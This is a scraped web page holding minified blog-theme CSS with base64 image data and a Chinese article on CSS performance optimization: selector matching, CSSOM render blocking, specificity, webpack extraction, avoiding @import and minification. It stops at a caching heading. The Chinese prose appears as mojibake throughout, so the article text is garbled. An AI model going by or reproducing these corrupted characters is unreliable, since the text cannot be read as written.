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) no-repeat 50%;background-size:64px 64px;opacity:.84}.markdown-body h1:after{position:absolute;content:"";width:150%;left:-25%;height:50%;bottom:12px;border-radius:50%;background:linear-gradient(transparent 80%,rgba(77,208,225,.8));background-size:400% 200%;opacity:.6;animation:h1Animate 6s linear infinite}@keyframes h1Animate{0%{background-position:100% 100%}50%{background-position:100% 50%}to{background-position:100% 100%}}.markdown-body h2{display:block;border-bottom:4px solid #4dd0e1;position:relative;font-size:24px;padding:12px 32px;margin:30px 0}.markdown-body h2:before{width:24px;height:24px;left:0;top:0;margin:auto;background-size:24px 24px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAADGklEQVRYR81X32vTYBQ999s6mFjQgQ+DrbHiVFZYU4cDcQ/6pGhTFVYFEXGi82H+Bz448UnEF1Fx9ccEEcXpZE3d5tP2ooKiTacTHaLNpigMHDgnU9tcSbrWrkwWR0sbyEOSe885ObnfvV8IRT6oyPwoLQHBx+OVM5WJvSyEVAhnBOjt7yU/+/rr6r6l8TMO+F/EN0JQhICqQpD/xaRpcpAc9tS+M+9lBCia/oqBamK+zeDuQogQZaKJk3wcQjxSva7tGQGB2Ke1zIk3DNyMyNL+QpCnMQOaPsDAVuGAp9cjvbYc8Ec/bCYSg0zoiHilk1tHxqsqEsYlML4kjIpT/eurJxRNPweQU5VdrWaOEo1fgKAVbBgXIz73kF3R/ph+ghgdzMYWM29eAWlBJqgZaFlFYtC6nhWpaDqnSGlIlV1WjJ3DloDNgyNLncudqgX//Ucg3LxuStHGuhi8pqKCW3rqV342rwFjRznKm+/LNaN2yC237ThgF2wxcfMLeP6+ncrKzoPoKTGeLQbYbg4TNoC5iZPJY5HGVRdSNZAWYBclD3FzBQzrR8hACAKdzBzKA/4/IYioDQaOskBbpEG6PO8qKKSAEi3CnEb0Pw4oMf0OmKbTDWqh3Lw6EIiNBZi5lxh3wz4puBD5ovqAMvxhHSdFKxE1CQe3m/07TeTX4lcJdAhE+1Sv65Z5P/ByvIGTRowIZ9igbtXnmrOsbTvgj+kHBNMuBu9OdVw8EeU4nC1A0cYmAHZOTRrLhra4Z8ywnSN6vZHAFTA2WnnMfQB3qz73ddsOZM8CACFDIPSgQXqebXEgqgeZcAeEe6pXasm1f8ew3igMtAHWac0Uc/jYdyAaP0xEBwFsmgUPqbJ0NE2UKj4EGcahiOzuyhagaHpnmtgcVgTcCMuua7YdyAHbA3ArQNscVFbb4635aD6fnYaTvxxi9UNP7ddMXaRWVBdAcaLk6bDXPZCNZ9uBXEsDUX1T2Cc9yjig6Z0EHg3LK8/aqf6MwJKchkXfks1+0+JtSq3qLPa23BRR1B+T/6nkfMaW1r9hPt/MLtYfTLEpP+T9FNoAAAAASUVORK5CYII=)}.markdown-body h2:after,.markdown-body h2:before{content:"";display:block;position:absolute;bottom:0}.markdown-body h2:after{right:0;width:400px;height:10px;border-top-right-radius:24px;background:linear-gradient(90deg,#fff,#4dd0e1);max-width:50vw}.markdown-body h3{margin:30px 0;font-size:18px;position:relative;padding:4px 32px;width:max-content}.markdown-body h3:before{border-bottom:2px solid #4dd0e1;width:100%;content:"";display:block;height:28px;position:absolute;left:0;top:0;bottom:-2px;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);background-repeat:no-repeat;animation:h3AnimationBefore 2s infinite alternate}@keyframes h3AnimationBefore{0%{width:28px}25%{width:100%}50%{width:100%}to{width:100%}}.markdown-body h3:after{content:"";display:block;width:28px;height:28px;position:absolute;border:2px solid #4dd0e1;border-radius:50%;right:-15px;top:0;bottom:0;margin:auto;background-size:28px 28px;background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAABRklEQVRYR2NkGGDAOMD2M4w6YDQERkNg+ITAppcfY/8zMv3wF+NdTUrZQpUQ2PT6cz8Dw/8CkMWMDIwNvqK8jcQ6gmIHNN19EaXPx1XPyMCghrCUKcpPlGc5MY6gyAE+Fx52MjL8j3cU5a1UYWXtZGBkEAVb+p8hxU+Mby5NHQCxnKEMaskzJ37uFmUetkmMjAzrfUX4woixHBJlZAA0y2EmPPYU4enLkhGeQIqRJDsAh+UgO7duNpD3IcVykkOA2paT5ABaWE60A2hlOdEO8D3/4CMDIyMfWvySFefoaYSoROh74eFXBgYGLiTNVLGc+BC48PAnAwMDG9QBVLOcaAd8P5ox+x/jf5AjGLgYfnwnKqv9/8/PwPO/kFF/MSj0cAKiouD/0bgYoixFU8RovWgJIX1EOYCQIZTIjzpgNARGQ2DAQwAAvHBaIdB7zxsAAAAASUVORK5CYII=);animation:h3AnimationAfter 2s infinite alternate}@keyframes h3AnimationAfter{0%{transform:rotate(0)}10%{transform:rotate(0)}50%{transform:rotate(-1turn)}to{transform:rotate(-1turn)}}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{margin-top:5px}.markdown-body p{line-height:inherit;margin:22px 0;letter-spacing:2px;font-size:14px;word-spacing:2px}.markdown-body img{max-width:80%;border-radius:6px;display:block;margin:20px auto!important;object-fit:contain;box-shadow:0 0 16px hsla(0,0%,43.1%,.45)}.markdown-body figcaption{display:block;font-size:13px;color:#2b2b2b}.markdown-body figcaption:before{content:"";background-image:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgBAMAAACBVGfHAAAAGFBMVEVHcExAuPtAuPpAuPtAuPpAuPtAvPxAuPokzOX5AAAAB3RSTlMAkDLqNegkoiUM7wAAAGBJREFUKM9jYBhcgMkBTUDVBE1BeDGqEtXychNUBeXlKEqACsrLQxB8lnCQQClCiWt5OYoSiAIkJVAF5eVBqAqAShTAAs7l5ShKWMwRAmAlSArASpAVgJUkCqIAscESHwCVVjMBK9JnbQAAAABJRU5ErkJggg==);display:inline-block;width:18px;height:18px;background-size:18px;background-repeat:no-repeat;background-position:50%;margin-right:5px;margin-bottom:-5px}.markdown-body hr{border:none;border-top:1px solid #4dd0e1;margin-top:32px;margin-bottom:32px}.markdown-body del{color:#4dd0e1}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:rgba(77,208,225,.08);color:#26c6da;padding:.195em .4em}.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace;overflow:auto;position:relative;line-height:1.75;box-shadow:0 0 8px hsla(0,0%,43.1%,.45);border-radius:4px;margin:16px}.markdown-body pre:before{content:"";display:block;height:30px;width:100%;margin-bottom:-7px;background:url(data:image/png;base64,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) 10px 10px no-repeat;background-size:40px}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{color:#4dd0e1;border-bottom:1px solid #4dd0e1;font-weight:400;text-decoration:none;margin:0 4px}.markdown-body a:active,.markdown-body a:hover{background-color:rgba(77,208,225,.1)}.markdown-body strong{color:#26c6da}.markdown-body strong:before{content:"ã€Œ"}.markdown-body strong:after{content:"ã€"}.markdown-body em{font-style:normal;color:#4dd0e1;font-weight:700}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:rgba(77,208,225,.05)}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{margin:2em 0;padding:24px 32px;border-left:4px solid #26c6da;background:rgba(77,208,225,.15);position:relative}.markdown-body blockquote:before{content:"â";top:8px;left:8px;color:#4dd0e1;font-size:30px;line-height:1;font-weight:700;position:absolute;opacity:.7}.markdown-body blockquote:after{content:"â";font-size:30px;position:absolute;right:8px;bottom:0;color:#4dd0e1;opacity:.7}.markdown-body blockquote p{color:#595959;line-height:2}.markdown-body ol,.markdown-body ul{color:#595959;padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">1ã€å‰è¨€</h2>
<p>å½“æ¶‰åŠåˆ°ç½‘ç«™çš„æ€§èƒ½ä¼˜åŒ–æ—¶ï¼ŒCSS çš„ä¼˜åŒ–æ˜¯ä¸€ä¸ªéå¸¸é‡è¦çš„æ–¹é¢ã€‚å¦‚æœä½ çš„ CSS å¤ªå¤æ‚ï¼Œé‚£ä¹ˆä½ çš„ç½‘ç«™å¯èƒ½ä¼šåƒä¸€ä¸ª<strong>æ…¢ååçš„ä¹Œé¾Ÿ</strong>ä¸€æ ·ç¼“æ…¢åœ°åŠ è½½å’Œæ¸²æŸ“ï¼Œå½±å“<strong>ç”¨æˆ·çš„ç•™å­˜</strong>ã€<strong>ç½‘ç«™çš„è½¬åŒ–ç‡</strong>ä»¥åŠ<strong>ç½‘ç«™çš„ä½“éªŒå’Œä¼ æ’­</strong>ç­‰ï¼Œæ‰€ä»¥å¯¹äº CSS ä¼˜åŒ–è¿˜æ˜¯éå¸¸éœ€è¦çš„ï¼Œæœ¬æ–‡å°†ä»‹ç»ä¸€äº› CSS æ€§èƒ½ä¼˜åŒ–çš„æŠ€å·§ï¼Œå¸®åŠ©ä½ åœ¨ç¼–å†™ CSS ä»£ç æ—¶æé«˜æ€§èƒ½ã€‚</p>
<h2 data-id="heading-1">2ã€å‰ç½®çŸ¥è¯†</h2>
<h3 data-id="heading-2">2.1 CSS è§£æè§„åˆ™</h3>
<p>æˆ‘ä»¬ä¸€èˆ¬ä¹¦å†™ CSS é€‰æ‹©å™¨éƒ½æ˜¯ä»å·¦å¾€å³ä¹¦å†™çš„ï¼Œæ‰€ä»¥è‡ªç„¶å°±ä¼šä»¥ä¸º CSS é€‰æ‹©å™¨æ˜¯ä»å·¦å¾€å³å»åŒ¹é…æ¸²æŸ“çš„ï¼Œä½†å…¶å®ä¸æ˜¯è¿™æ ·çš„ï¼Œ<strong>CSS é€‰æ‹©å™¨æ˜¯ä»å³å¾€å·¦å»åŒ¹é…çš„</strong>ã€‚</p>
<pre><code class="hljs language-css" lang="css"><span class="hljs-selector-class">.header</span> <span class="hljs-selector-tag">div</span> <span class="hljs-selector-tag">span</span> { 
  <span class="hljs-attribute">color</span>: red;
}
</code></pre>
<p>æ¯”å¦‚ä¸Šé¢çš„ CSS æ ·å¼åŒ¹é…æŸ¥æ‰¾è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š</p>
<ol>
<li>å…ˆæ‰¾åˆ°æ‰€æœ‰çš„ <code>span</code> å…ƒç´ ã€‚</li>
<li>ä»ç¬¬ä¸€ä¸ª <code>span</code> å…ƒç´ å¼€å§‹ï¼Œæ²¿ç€ <code>span</code> å…ƒç´ çš„çˆ¶çº§å…ƒç´ æŸ¥åˆ° <code>div</code>ï¼Œæœ€åæ²¿ç€ <code>div</code> çš„çˆ¶çº§å…ƒç´ æ‰¾åˆ°æ‰€æœ‰çš„ <code>.header</code>ï¼Œæ‰¾åˆ°æ»¡è¶³æ¡ä»¶çš„èŠ‚ç‚¹å°±åŠ å…¥åˆ°ç»“æœé›†ä¸­ã€‚</li>
</ol>
<h3 data-id="heading-3">2.2 CSS çš„åŠ è½½è¿‡ç¨‹</h3>
<p><strong>ç®€è¿°æµè§ˆå™¨çš„æ¸²æŸ“è¿‡ç¨‹</strong>ï¼šåœ¨æ‹¿åˆ° html æ–‡ä»¶åï¼Œæµè§ˆå™¨ä¼šè°ƒç”¨ html è§£æå™¨è§£æ html æ–‡ä»¶ï¼Œæ„å»º DOM æ ‘å’Œ CSSOM æ ‘ï¼Œç„¶å DOM æ ‘å’Œ CSSOM æ ‘åˆå¹¶æˆæ¸²æŸ“æ ‘ï¼Œæœ€åæµè§ˆå™¨ä¼šæ ¹æ®æ¸²æŸ“æ ‘è¿›è¡Œå¸ƒå±€å’Œç»˜åˆ¶ï¼Œæœ€ç»ˆå°†é¡µé¢å‘ˆç°ç»™ç”¨æˆ·ã€‚</p>
<p><strong>CSSOM çš„æ„å»º</strong>ï¼šå½“æµè§ˆå™¨è§£æ html æ–‡æ¡£æ—¶ï¼Œå¦‚æœé‡åˆ° <code>&lt;link&gt;</code> æˆ– <code>&lt;style&gt;</code> æ ‡ç­¾ï¼Œä¼šå¼€å§‹ä¸‹è½½å’Œè§£æ CSS æ–‡ä»¶ï¼Œæ„å»º CSSOMã€‚åœ¨ CSSOM æ„å»ºå®Œæˆä¹‹å‰ï¼Œæµè§ˆå™¨ä¸ä¼šæ¸²æŸ“ä»»ä½•å·²å¤„ç†çš„å†…å®¹ï¼Œå³ä½¿DOMå·²ç»è§£æå®Œæ¯•ã€‚</p>
<ul>
<li>CSS ä¸ä¼šé˜»å¡ <code>DOM</code> çš„è§£æï¼Œä½†ä¼šé˜»å¡ <code>DOM</code> çš„æ¸²æŸ“ã€‚</li>
<li>CSS ä¸ä¼šé˜»å¡ <code>Javascript</code> çš„ä¸‹è½½ï¼Œä½†ä¼šé˜»å¡ <code>JavaScript</code> çš„æ‰§è¡Œï¼Œå› ä¸º <code>JavaScript</code> å¯ä»¥æ“ä½œæ ·å¼ï¼Œæ‰€ä»¥éœ€è¦ç­‰ <code>CSSOM</code> æ„å»ºå®Œæˆä¹‹åï¼Œæ‰èƒ½æ‰§è¡Œ <code>JavaScript</code>ã€‚</li>
</ul>
<p>æ‰€ä»¥ä»è¿™é‡Œå°±å¯ä»¥å¾—åˆ°ä»¥ä¸‹ä¼˜åŒ–æ€è·¯ï¼šã€‚</p>
<ul>
<li>å°†ä¸€äº›<strong>ä½“ç§¯å°çš„é¦–å±å…³é”® CSS</strong> å†…è”åˆ° <code>html</code> æ–‡ä»¶ä¸­ï¼ŒåŠ å¿«é¦–å±æ¸²æŸ“é€Ÿåº¦ã€‚</li>
<li>å°† CSS æ”¾åœ¨ <code>&lt;head&gt;</code> ä¸­ï¼Œç¡®ä¿å°½æ—©åŠ è½½ã€‚</li>
<li>ä½¿ç”¨åª’ä½“æŸ¥è¯¢ï¼ˆå¦‚ <code>media="print"</code>ï¼‰ä½¿ CSS éé˜»å¡æ¸²æŸ“ã€‚</li>
<li>åœ¨ç”Ÿäº§ç¯å¢ƒä¸­ï¼Œè€ƒè™‘ä½¿ç”¨ preloadï¼ˆå¦‚ <code>&lt;link rel="preload" as="style"&gt;</code>ï¼‰åœ¨ä¸é˜»å¡æ¸²æŸ“çš„æƒ…å†µä¸‹åŠ è½½éé¦–å±çš„ CSS èµ„æºã€‚</li>
</ul>
<h3 data-id="heading-4">2.3 CSS æƒé‡ä¼˜å…ˆçº§</h3>
<p>CSS é€‰æ‹©å™¨ç±»å‹çš„ä¼˜å…ˆçº§ä»ä½å¾€é«˜ä¾æ¬¡æ˜¯ï¼š</p>
<ol>
<li><strong>ç±»å‹é€‰æ‹©å™¨</strong>ï¼ˆæ¯”å¦‚ <code>h1</code>ï¼‰å’Œ<strong>ä¼ªå…ƒç´ é€‰æ‹©å™¨</strong>ï¼ˆæ¯”å¦‚ <code>::before</code>ï¼‰ã€‚</li>
<li><strong>ç±»é€‰æ‹©å™¨</strong>ï¼ˆæ¯”å¦‚ <code>.header</code>ï¼‰ã€<strong>å±æ€§é€‰æ‹©å™¨</strong>ï¼ˆæ¯”å¦‚ <code>[type="checkbox"]</code>ï¼‰å’Œ<strong>ä¼ªç±»é€‰æ‹©å™¨</strong>ï¼ˆæ¯”å¦‚ <code>:hover</code>ï¼‰ã€‚</li>
<li><strong>ID é€‰æ‹©å™¨</strong>ï¼ˆæ¯”å¦‚ <code>#box</code>ï¼‰ã€‚</li>
<li><strong>!important</strong>ï¼šä¼˜å…ˆçº§æœ€é«˜ã€‚</li>
</ol>
<h2 data-id="heading-5">2ã€CSS åŠ è½½æ€§èƒ½ä¼˜åŒ–</h2>
<h3 data-id="heading-6">2.1. æå–å…¬å…±çš„ CSS æ–‡ä»¶</h3>
<p>å¦‚æœä½¿ç”¨<code>webpack</code>è¿›è¡Œé¡¹ç›®æ‰“åŒ…ï¼Œåœ¨æ‰“åŒ…é˜¶æ®µå¯ä»¥ä½¿ç”¨<code>mini-css-extract-plugin</code>æå–å…¬å…± CSS æ–‡ä»¶ï¼Œä¾¿äºç¼“å­˜ä»¥åŠå‡å°‘ CSS è¯·æ±‚æ¬¡æ•°ã€‚</p>
<h3 data-id="heading-7">2.2 é¿å…ä½¿ç”¨ @import</h3>
<ul>
<li>ä½¿ç”¨ <code>@import</code> ä¼šé˜»å¡æµè§ˆå™¨çš„å¹¶è¡Œä¸‹è½½ï¼Œå¯¼è‡´åŠ è½½é€Ÿåº¦å˜æ…¢ã€‚</li>
<li>å¤šä¸ª <code>@import</code> ä¼šå¯¼è‡´ä¸‹è½½é¡ºåºç´Šä¹±ã€‚</li>
</ul>
<h3 data-id="heading-8">2.3 å‹ç¼© CSS æ–‡ä»¶</h3>
<p>å‹ç¼© CSS æ–‡ä»¶å¯ä»¥å‡å°æ–‡ä»¶å¤§å°ï¼Œä»è€ŒåŠ å¿«åŠ è½½é€Ÿåº¦ã€‚æ¯”å¦‚å¯ä»¥ç”¨<code>optimize-css-assets-webpack-plugin</code>é…åˆ<code>mini-css-extract-plugin</code>ä½¿ç”¨æ¥ä¼˜åŒ–å’Œå‹ç¼© CSS æ–‡ä»¶ã€‚</p>
<h3 data-id="heading-9">2.4 ä½¿ç”¨æµè§ˆå™¨ç¼“å­˜</h3>
